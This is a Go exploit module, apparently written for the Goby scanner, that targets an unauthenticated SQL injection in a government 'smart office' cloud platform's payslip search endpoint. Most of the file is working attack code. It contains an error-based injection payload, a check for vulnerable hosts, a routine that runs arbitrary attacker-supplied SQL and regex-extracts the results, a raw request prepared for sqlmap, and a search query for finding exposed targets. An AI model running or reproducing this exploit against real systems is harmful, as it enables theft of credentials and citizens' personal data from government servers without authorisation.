package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Digital Communication Fingertip Cloud Platform Smart Government /payslip/search/index/userid/time/time SQL Injection Vulnerability",
    "Description": "<p>The Digital Communication Cloud Platform Smart Government Product is an intelligent office system tailored for government departments based on advanced technologies such as cloud computing, big data, and artificial intelligence. The system aims to improve the office efficiency, collaboration capabilities, and information resource sharing level of government departments, and promote the development of e-government to a higher level. The Digital Communication Cloud Platform Smart Government PayslipUser interface has a SQL injection vulnerability. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.</p>",
    "Product": "Digitally-Finger-Tip-CP",
    "Homepage": "http://www.sztbj.com/product/download.php",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-11-06",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"assets/8cca19ff/css/bootstrap-yii.css\" && body!=\"亦庄\"",
    "GobyQuery": "body=\"assets/8cca19ff/css/bootstrap-yii.css\" && body!=\"亦庄\"",
    "Level": "2",
    "Impact": "<p>The Digital Communication Cloud Platform Smart Government PayslipUser interface has a SQL injection vulnerability. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Please pay attention to official information and update to the latest version in time: <a href=\"http://www.sztbj.com/product/download.php\">http://www.sztbj.com/product/download.php</a> </p><p>2. Reduce or do not use string concatenation to execute SQL, but pass user input as parameters to the SQL execution method </p><p> 3. Verify the value entered by the user</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/140503043"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "user()",
            "show": "attackType=custom"
        },
        {
            "name": "default",
            "type": "select",
            "value": "user(),database(),version()",
            "show": "attackType=default"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "数字通指尖云平台-智慧政务 /payslip/search/index/userid/time/time SQL 注入漏洞",
            "Product": "数字通指尖云平台",
            "Description": "<p>数字通 云平台 智慧政务产品是基于云计算、大数据、人工智能等先进技术，为政府部门量身定制的智能化办公系统。该系统旨在提高政府部门的办公效率、协同能力和信息资源共享水平，推动电子政务向更高层次发展。数字通云平台 智慧政务PayslipUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1.请关注官方信息，及时更新到最新版本：<a href=\"http://www.sztbj.com/product/download.php\">http://www.sztbj.com/product/download.php</a></p><p>2.减少使用或不使用字符串拼接的方式执行SQL，而是将用户输入当着参数传给执行SQL的方法&nbsp;</p><p>3.对用户输入的值进行校验<br></p>",
            "Impact": "<p>数字通云平台 智慧政务PayslipUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Digital Communication Fingertip Cloud Platform Smart Government /payslip/search/index/userid/time/time SQL Injection Vulnerability",
            "Product": "Digitally-Finger-Tip-CP",
            "Description": "<p>The Digital Communication Cloud Platform Smart Government Product is an intelligent office system tailored for government departments based on advanced technologies such as cloud computing, big data, and artificial intelligence. The system aims to improve the office efficiency, collaboration capabilities, and information resource sharing level of government departments, and promote the development of e-government to a higher level. The Digital Communication Cloud Platform Smart Government PayslipUser interface has a SQL injection vulnerability. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Please pay attention to official information and update to the latest version in time: <a href=\"http://www.sztbj.com/product/download.php\">http://www.sztbj.com/product/download.php</a>&nbsp;</p><p>2. Reduce or do not use string concatenation to execute SQL, but pass user input as parameters to the SQL execution method&nbsp;</p><p>&nbsp;3. Verify the value entered by the user<br></p>",
            "Impact": "<p>The Digital Communication Cloud Platform Smart Government PayslipUser interface has a SQL injection vulnerability. In addition to being able to use the SQL injection vulnerability to obtain information in the database (for example, administrator backend passwords, user personal information of the site), unauthenticated remote attackers can even write Trojans into the server with high permissions to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	setSqlPayloadwV7lbsgw := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		defineHeader := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36",
			"Accept-Encoding": "gzip, deflate",
		}
		
		rawPayload := fmt.Sprintf("(SELECT 1404 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (%s)),0x716a706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)", sql)
		//将rawPayload进行url编码
		rawPayload = url.QueryEscape(rawPayload)
		urlget := "/payslip/search/index/userid/time/time?PayslipUser[user_id]=" + rawPayload
		resp, err = setGetRequest(hostInfo, urlget, defineHeader)

		if resp == nil {
			return nil, "", errors.New("Fail")
		}

		if err != nil {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/payslip/search/index/userid/time/time"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			MD5Reslut := rand.Intn(99999)
			MD5ResultStr := fmt.Sprintf("%d", MD5Reslut)
			//将MD5Hash进行md5加密
			MD5Hash := md5.New()
			MD5Hash.Write([]byte(MD5ResultStr))
			content := hex.EncodeToString(MD5Hash.Sum(nil))

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "MD5(" + MD5ResultStr + ")"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			//regular := `<td align="left">([\s\S]*)<\/td>`
			//
			//makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			//	reRequest := regexp.MustCompile(RegularUrl)
			//	if !reRequest.MatchString(RegularContent) {
			//		return "", fmt.Errorf("can't match value")
			//	}
			//	getname := reRequest.FindStringSubmatch(RegularContent)
			//	return getname[1], nil
			//}

			sendPayload := setSqlPayloadwV7lbsgw
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}

			if !strings.Contains(resp.RawBody, content) {
				return false
			}

			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			sqlpoint := "GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=1* HTTP/1.1\n" +
				"Host: " + expResult.HostInfo.HostInfo + "\n" +
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\n" +
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n" +
				"Accept-Encoding: gzip, deflate\n" +
				"Accept-Language: zh-CN,zh;q=0.9\n" +
				"Upgrade-Insecure-Requests: 1\n\n"
			// 3.配置正则语句，从响应包中提取出数据
			//regular := `qjkqq([\s\S]*?)qjxjq`
			regular := `qqpbq([^"]+)qjpbq1`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadwV7lbsgw
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "default" {
				sql := goutils.B2S(ss.Params["default"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else if attacktype == "custom" {
				sql := goutils.B2S(ss.Params["custom"])
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
